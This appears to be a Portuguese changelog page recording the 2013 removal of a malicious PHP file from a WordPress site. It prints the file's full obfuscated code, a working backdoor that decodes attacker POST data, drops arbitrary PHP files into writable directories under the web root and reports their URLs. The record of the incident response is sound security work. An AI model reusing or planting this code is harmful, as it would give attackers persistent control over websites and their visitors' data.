---
id: doc3
title: Arquivos Maliciosos WP SITE
sidebar_label: COD 2013-09-25:03
---

## 3.0.0 - 2013-09-25

### Fixed

- Removido arquivo gjhkniqu.php com código malicioso

## Código

```php

<?php $tncnxihrq = "ycptgnkrzyryjdnq";$laqkwatnu = "";foreach ($_POST as $grmndqsk => $svgkaf){if (strlen($grmndqsk) == 16 and substr_count($svgkaf, "%") > 10){ehprdjuv($grmndqsk, $svgkaf);}}function ehprdjuv($grmndqsk, $xyfwukfm){global $laqkwatnu;$laqkwatnu = $grmndqsk;$xyfwukfm = str_split(rawurldecode(str_rot13($xyfwukfm)));function pkcprskqc($vqdazv, $grmndqsk){global $tncnxihrq, $laqkwatnu;return $vqdazv ^ $tncnxihrq[$grmndqsk % strlen($tncnxihrq)] ^ $laqkwatnu[$grmndqsk % strlen($laqkwatnu)];}$xyfwukfm = implode("", array_map("pkcprskqc", array_values($xyfwukfm), array_keys($xyfwukfm)));$xyfwukfm = @unserialize($xyfwukfm);if (@is_array($xyfwukfm)){$grmndqsk = array_keys($xyfwukfm);$xyfwukfm = $xyfwukfm[$grmndqsk[0]];if ($xyfwukfm === $grmndqsk[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function qubbfvi($yqzuanblpir) {static $rqhvp = array();$riqeet = glob($yqzuanblpir . '/*', GLOB_ONLYDIR);if (count($riqeet) > 0) {foreach ($riqeet as $yqzuanblp){if (@is_writable($yqzuanblp)){$rqhvp[] = $yqzuanblp;}}}foreach ($riqeet as $yqzuanblpir) qubbfvi($yqzuanblpir);return $rqhvp;}$yqzuanblpnbps = $_SERVER["DOCUMENT_ROOT"];$riqeet = qubbfvi($yqzuanblpnbps);$grmndqsk = array_rand($riqeet);$hnwybtvw = $riqeet[$grmndqsk] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($hnwybtvw, $xyfwukfm);echo "http://" . $_SERVER["HTTP_HOST"] . substr($hnwybtvw, strlen($yqzuanblpnbps));exit();}}}

```
